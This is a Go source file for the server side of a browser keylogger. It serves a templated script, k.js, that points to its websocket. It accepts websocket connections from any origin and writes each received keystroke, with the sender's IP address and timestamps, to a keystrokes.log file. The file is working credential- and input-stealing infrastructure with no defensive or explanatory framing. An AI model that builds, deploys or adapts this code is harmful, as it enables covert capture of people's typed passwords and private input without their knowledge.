package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"text/template"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type Keystroke struct {
	Key       string `json:"key"`
	Source    string `json:"source"`
	Timestamp string `json:"timestamp"`
}

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
)

const logfile = "keystrokes.log"

func init() {
	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}

}

func appendToFile(filename, data string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error writing to file %v:", err)
		return
	}
	defer f.Close()

	if _, err := f.WriteString(data); err != nil {
		log.Printf("Error writing data: %v", err)
	}
}

func serverWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}
	defer conn.Close()

	ip := r.RemoteAddr
	start := time.Now()
	log.Printf("New Websocket connection from %s\n", ip)

	sessionHandler := fmt.Sprintf(
		"\n===== Session Start =====\nTime: %s\nIP: %s\n\nKeystrokes:\n",
		start.Format("2006-01-02 15:04:05"),
		ip,
	)
	appendToFile(logfile, sessionHandler)

	defer func() {
		end := time.Now()
		duration := end.Sub(start)

		sessionFooter := fmt.Sprintf(
			"\n===== Session End =====\nTime: %s\nDuration: %s\n=========================\n",
			end.Format("2006-01-02 15:04:05"),
			duration.Truncate(time.Second),
		)
		appendToFile(logfile, sessionFooter)
		log.Printf("Closed connection from %s (Duration: %s)\n", ip, duration)

		conn.Close()
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Connection from %s closed\n", ip)
			return
		}
		var ks Keystroke
		if err := json.Unmarshal(msg, &ks); err != nil {
			log.Printf("Inavalid message: %s\n", msg)
			continue
		}
		entry := fmt.Sprintf("[%s] (%s) %s\n", ks.Timestamp, ks.Source, ks.Key)

		appendToFile(logfile, entry)
	}

}

func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	err := jsTemplate.Execute(w, struct{ Addr string }{wsAddr})
	if err != nil {
		http.Error(w, err.Error(), 500)
	}

}

func main() {
	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for websocket connection")
	flag.Parse()
	r := mux.NewRouter()
	r.HandleFunc("/ws", serverWS)
	r.HandleFunc("/k.js", serveFile)
	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/form.html")
	})
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	log.Printf("Listening on %s\n", listenAddr)

	log.Fatal(http.ListenAndServe(":8080", r))
}
